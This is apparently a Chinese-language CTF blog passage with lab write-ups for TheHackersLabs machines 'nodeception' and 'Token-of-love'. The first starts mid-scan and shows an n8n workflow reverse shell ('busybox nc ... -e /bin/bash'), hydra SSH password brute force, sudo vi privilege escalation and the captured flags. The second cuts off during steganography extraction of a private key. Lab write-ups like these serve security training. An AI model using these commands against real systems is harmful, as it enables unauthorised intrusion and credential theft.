class="hljs-string">SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201</span><br><span class="hljs-string">SF:975\r\nVary:\x20Accept-Encoding\r\nDate:\x20Thu,\x2021\x20Aug\x202025\x</span><br><span class="hljs-string">SF:2015:07:44\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;h</span><br><span class="hljs-string">SF:tml\x20lang=\&quot;en\&quot;&gt;\n\t&lt;head&gt;\n\t\t&lt;script\x20type=\&quot;module\&quot;\x20crosso</span><br><span class="hljs-string">SF:rigin\x20src=\&quot;/assets/polyfills-B8p9DdqU\.js\&quot;&gt;&lt;/script&gt;\n\n\t\t&lt;meta\</span><br><span class="hljs-string">SF:x20charset=\&quot;utf-8\&quot;\x20/&gt;\n\t\t&lt;meta\x20http-equiv=\&quot;X-UA-Compatible\&quot;</span><br><span class="hljs-string">SF:\x20content=\&quot;IE=edge\&quot;\x20/&gt;\n\t\t&lt;meta\x20name=\&quot;viewport\&quot;\x20conten</span><br><span class="hljs-string">SF:t=\&quot;width=device-width,initial-scale=1\.0\&quot;\x20/&gt;\n\t\t&lt;link\x20rel=\&quot;i</span><br><span class="hljs-string">SF:con\&quot;\x20href=\&quot;/favicon\.ico\&quot;\x20/&gt;\n\t\t&lt;style&gt;@media\x20\(prefers-c</span><br><span class="hljs-string">SF:olor-scheme:\x20dark\)\x20&#123;\x20body\x20&#123;\x20background-color:\x20rgb\(4</span><br><span class="hljs-string">SF:5,\x2046,\x2046\)\x20&#125;\x20&#125;&lt;/style&gt;\n\t\t&lt;script\x20type=\&quot;text/javascr</span><br><span class="hljs-string">SF:ipt\&quot;&gt;\n\t\t\twindow\.BASE_PATH\x20=\x20&#x27;/&#x27;;\n\t\t\twindow\.REST_ENDPOI</span><br><span class="hljs-string">SF:NT\x20=\x20&#x27;rest&#x27;;\n\t\t&lt;/script&gt;\n\t\t&lt;script\x20src=\&quot;/rest/sentry\.j</span><br><span class="hljs-string">SF:s\&quot;&gt;&lt;/script&gt;\n\t\t&lt;script&gt;!function\(t,e\)&#123;var\x20o,n,&quot;</span>)%r(HTTPOptions<br>SF:,183,<span class="hljs-string">&quot;HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20d</span><br><span class="hljs-string">SF:efault-src\x20&#x27;none&#x27;\r\nX-Content-Type-Options:\x20nosniff\r\nContent-T</span><br><span class="hljs-string">SF:ype:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nVary:\</span><br><span class="hljs-string">SF:x20Accept-Encoding\r\nDate:\x20Thu,\x2021\x20Aug\x202025\x2015:07:44\x2</span><br><span class="hljs-string">SF:0GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\</span><br><span class="hljs-string">SF:&quot;</span>en\&quot;&gt;\n&lt;<span class="hljs-built_in">head</span>&gt;\n&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/he<br>SF:ad&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20OPTIONS\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n<span class="hljs-string">&quot;)%r(</span><br><span class="hljs-string">SF:RTSPRequest,183,&quot;</span>HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-P<br>SF:olicy:\x20default-src\x20<span class="hljs-string">&#x27;none&#x27;</span>\r\nX-Content-Type-Options:\x20nosniff\r<br>SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2014<br>SF:3\r\nVary:\x20Accept-Encoding\r\nDate:\x20Thu,\x2021\x20Aug\x202025\x20<br>SF:15:07:45\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;htm<br>SF:l\x20lang=\&quot;en\&quot;&gt;\n&lt;<span class="hljs-built_in">head</span>&gt;\n&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;/t<br>SF:itle&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20OPTIONS\x20/&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/h<br>SF:tml&gt;\n<span class="hljs-string">&quot;);</span><br><span class="hljs-string">MAC Address: 08:00:27:32:DB:77 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 14.61 seconds</span><br></code></pre></td></tr></table></figure><ol><li><strong>22端口：ssh服务</strong>，版本为<code>OpenSSH 9.6p1</code></li><li><strong>5678端口：rrac服务</strong>，远程复制代理连接</li><li><strong>8765端口：http服务</strong>，版本为<code>Apache httpd 2.4.58</code></li></ol><h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sU --top-ports 100 192.168.2.70<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-21 23:52 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.70<br>Host is up (0.00093s latency).<br>All 100 scanned ports on 192.168.2.70 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 58 closed udp ports (port-unreach), 42 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:32:DB:77 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 55.60 seconds<br></code></pre></td></tr></table></figure><p>没有开放的端口</p><h3 id="4-脚本漏洞扫描"><a href="#4-脚本漏洞扫描" class="headerlink" title="4.脚本漏洞扫描"></a>4.脚本漏洞扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --script=vuln -p22,5678,8765 192.168.2.70<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-21 23:54 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.70<br>Host is up (0.00097s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>5678/tcp open  rrac<br>8765/tcp open  ultraseek-http<br>MAC Address: 08:00:27:32:DB:77 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.75 seconds<br></code></pre></td></tr></table></figure><p>没有新的东西</p><h1 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h1><h2 id="1、WEB-5678端口渗透"><a href="#1、WEB-5678端口渗透" class="headerlink" title="1、WEB-5678端口渗透"></a>1、WEB-5678端口渗透</h2><p>访问5678端口，发现是<code>n8n</code>服务，根据之前做过的靶机，发现<code>n8n</code>服务里面存在反弹shell的地方，但是需要进行登录<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202508262135920.png"><br>先暂时搁置</p><h2 id="2、WEB-8765渗透"><a href="#2、WEB-8765渗透" class="headerlink" title="2、WEB-8765渗透"></a>2、WEB-8765渗透</h2><p>访问8765端口，发现是<code>Apache</code>默认页面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202508262138288.png"></p><p>查看页面源码，找到相关的提示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!-- usuario@maildelctf.com<br>Espero que hayas cambiado la contraseña como se te indicó.<br>Recuerda: mínimo 8 caracteres, al menos 1 número y 1 mayúscula.<br> --&gt;<br></code></pre></td></tr></table></figure><p>翻译一下吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">usuario@maildelctf.com<br>我希望你已经按照指示更改了密码。<br>记住：至少8个字符，至少1个数字和1个大写字母。<br></code></pre></td></tr></table></figure><p>说明用户名是<code>usuario@maildelctf.com</code>，密码至少8个字符，至少1个数字和1个大写字母</p><h2 id="3、n8n渗透"><a href="#3、n8n渗透" class="headerlink" title="3、n8n渗透"></a>3、n8n渗透</h2><h3 id="1-密码爆破"><a href="#1-密码爆破" class="headerlink" title="1.密码爆破"></a>1.密码爆破</h3><p>根据上面的提示，尝试从<code>rockyou</code>字典前5000里面找出符合的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">head</span> -n 5000 /usr/share/wordlists/rockyou.txt | grep -P <span class="hljs-string">&#x27;^(?=.*\d)(?=.*[A-Z]).&#123;8,&#125;$&#x27;</span> <br>Password1<br>PASSWORD1<br></code></pre></td></tr></table></figure><p>使用<code>usuario@maildelctf.com:Password1</code>成功进入后台</p><h3 id="2-反弹shell"><a href="#2-反弹shell" class="headerlink" title="2.反弹shell"></a>2.反弹shell</h3><ol><li><p>通过工作流可以执行命令<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202508262156157.png"></p></li><li><p>测试是否可以执行命令，发现能成功执行<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202508262157448.png"></p></li><li><p>反弹<code>shell</code><br>反弹shell命令：<code>busybox nc 192.168.2.4 -e /bin/bash</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202508262159813.png"></p></li><li><p>成功获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nc -lvnp 4444        <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.70] 39622<br><span class="hljs-built_in">id</span><br>uid=1000(thl) gid=1000(thl) <span class="hljs-built_in">groups</span>=1000(thl),4(adm),24(cdrom),27(<span class="hljs-built_in">sudo</span>),30(dip),46(plugdev),101(lxd)<br></code></pre></td></tr></table></figure></li><li><p>获取稳定的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/bin/script -qc /bin/bash /dev/null<br><span class="hljs-comment"># 按下 Ctrl+Z 将其挂起</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br><span class="hljs-comment"># 按下回车</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure></li></ol><h1 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h1><p>查看用户<code>id</code>，发现属于<code>sudo组和lxd组</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">thl@nodeception:~$ <span class="hljs-built_in">id</span><br>uid=1000(thl) gid=1000(thl) <span class="hljs-built_in">groups</span>=1000(thl),4(adm),24(cdrom),27(<span class="hljs-built_in">sudo</span>),30(dip),46(plugdev),101(lxd)<br></code></pre></td></tr></table></figure><p>查看<code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">thl@nodeception:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> thl on nodeception:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,<br>    use_pty<br><br>User thl may run the following commands on nodeception:<br>    (ALL) NOPASSWD: /usr/bin/vi<br>    (ALL : ALL) ALL<br></code></pre></td></tr></table></figure><p>发现<code>vi</code>不需要密码即可执行<code>root</code>权限，直接进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">thl@nodeception:~$ <span class="hljs-built_in">sudo</span> vi<br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> thl: <br></code></pre></td></tr></table></figure><p>发现需要密码</p><p>尝试使用<code>hydra</code>爆破用户<code>thl</code>的密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# hydra -l thl -P /usr/share/wordlists/rockyou.txt -t 8 192.168.2.70 ssh<br>Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-26 22:12:37<br>[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore<br>[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task<br>[DATA] attacking ssh://192.168.2.70:22/<br>[22][ssh] host: 192.168.2.70   login: thl   password: basketball<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-26 22:13:20<br></code></pre></td></tr></table></figure><p>得到密码<code>basketball</code></p><p>进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">thl@nodeception:/tmp$ <span class="hljs-built_in">sudo</span> vi<br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> thl: <br>!/bin/bash<br>root@nodeception:/tmp# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">thl@nodeception:/tmp$ <span class="hljs-built_in">sudo</span> -i<br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> thl: <br>root@nodeception:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><h1 id="四、获取FLAG"><a href="#四、获取FLAG" class="headerlink" title="四、获取FLAG"></a>四、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@nodeception:~# <span class="hljs-built_in">cat</span> /home/thl/user.txt /root/root.txt <br>THL_wdYkVpXlqNaEUhRJfzbtHm<br>THL_QzXeoMuYRcJtWHabnLKfgDi<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Thehackerslabs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>n8n</tag>
      
      <tag>sudo-vi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Token-of-love</title>
    <link href="/Thehackerslabs/Token-of-love/"/>
    <url>/Thehackerslabs/Token-of-love/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li><a href="https://thehackerslabs.com/token-of-love/">https://thehackerslabs.com/token-of-love/</a></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.2.0/24               <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 09:46 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00018s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00026s latency).<br>MAC Address: 08:00:27:0B:D1:2B (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.20<br>Host is up (0.0012s latency).<br>MAC Address: 08:00:27:70:85:D5 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 28.09 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.20</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --min-rate 10000 -p- 192.168.2.20<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 09:48 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.20<br>Host is up (0.017s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:70:85:D5 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 15.77 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p22,80 192.168.2.20 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 09:50 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.20<br>Host is up (0.00069s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>MAC Address: 08:00:27:70:85:D5 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 21.30 seconds<br></code></pre></td></tr></table></figure><ol><li><strong>22端口：ssh服务</strong>，版本为<code>OpenSSH 9.2p1</code></li><li><strong>80端口：http服务</strong>，版本为<code>Apache httpd 2.4.62</code></li></ol><h3 id="3-漏洞脚本扫描"><a href="#3-漏洞脚本扫描" class="headerlink" title="3.漏洞脚本扫描"></a>3.漏洞脚本扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80 192.168.2.20           <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 09:51 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.20<br>Host is up (0.00076s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.2.20</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.2.20:80/</span><br><span class="hljs-string">|     Form id: username</span><br><span class="hljs-string">|     Form action: /</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.2.20:80/register</span><br><span class="hljs-string">|     Form id: username</span><br><span class="hljs-string">|_    Form action: /register</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-enum: <br>|_  /register/: Potentially interesting folder<br>MAC Address: 08:00:27:70:85:D5 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 64.30 seconds<br></code></pre></td></tr></table></figure><p>找到http服务存在目录<code>/register</code></p><h1 id="二、漏洞渗透"><a href="#二、漏洞渗透" class="headerlink" title="二、漏洞渗透"></a>二、漏洞渗透</h1><h2 id="1、WEB-80端口渗透"><a href="#1、WEB-80端口渗透" class="headerlink" title="1、WEB-80端口渗透"></a>1、WEB-80端口渗透</h2><p>访问页面，是一个登录框<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502180959815.png"></p><p>根据找到的<code>/register</code>目录，进行注册登录，成功进入页面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181001482.png"><br>页面提示信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">**administrador** (2025/2/18 10:00:29): Bienvenido. En Token Of Love, la pasión por la ciberseguridad se une al amor digital.<br>欢迎光临。在《爱的信物》中，对网络安全的热情与数字爱情相遇。<br><br>**administrador** (2025/2/18 10:00:29): Dicen que las claves viajan por rutas interplanetarias, vagando por el espacio infinito y estando en todas partes a la vez… ¿será magia o pura tecnología? 😉🔮 bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu<br>据说钥匙沿着星际路线旅行，在无限的空间中漫游，同时出现在任何地方……这是魔法还是纯粹的技术？ 😉🔮bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu<br></code></pre></td></tr></table></figure><p>查看页面源码，找到相关的提示<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181004404.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Busca el conejo hacker amoroso en un mundo interplanetario !<br>在星际世界中寻找可爱的黑客兔子！<br>Solo los usuarios admin pueden enviar mensajes<br>只有管理员用户可以发送消息<br></code></pre></td></tr></table></figure><h3 id="1-IPFS渗透"><a href="#1-IPFS渗透" class="headerlink" title="1.IPFS渗透"></a>1.IPFS渗透</h3><p>根据上面的提示查找到IPFS，下载安装一个IPFS工具，导入上面的钥匙<code>bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181033528.png"></p><p>进行下载后，查看文件，发现是一个webp文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ file miao      <br>miao: RIFF (little-endian) data, Web/P image<br></code></pre></td></tr></table></figure><p>使用webp文件的图像隐写术工具<code>imgconceal</code>进行检查<br><a href="https://github.com/tbpaolini/imgconceal">https://github.com/tbpaolini/imgconceal</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mv</span> miao miao.webp                                    <br><br>┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ ./imgconceal --check=miao.webp                                  <br>Input password <span class="hljs-keyword">for</span> the hidden file (may be blank)<br>Password: <br>Scanning cover image <span class="hljs-keyword">for</span> suitable carrier bits... Done!  <br>Found file <span class="hljs-string">&#x27;private.key&#x27;</span>:<br>  hidden on:     Fri Feb 14 01:49:04 2025<br>  last access:   Fri Feb 14 01:40:31 2025<br>  last modified: Thu Feb 13 08:38:30 2025<br>  size: 1.70 KB<br><br>The cover image <span class="hljs-string">&#x27;miao.webp&#x27;</span> can hide approximately more 391.77 KB (after compression of hidden 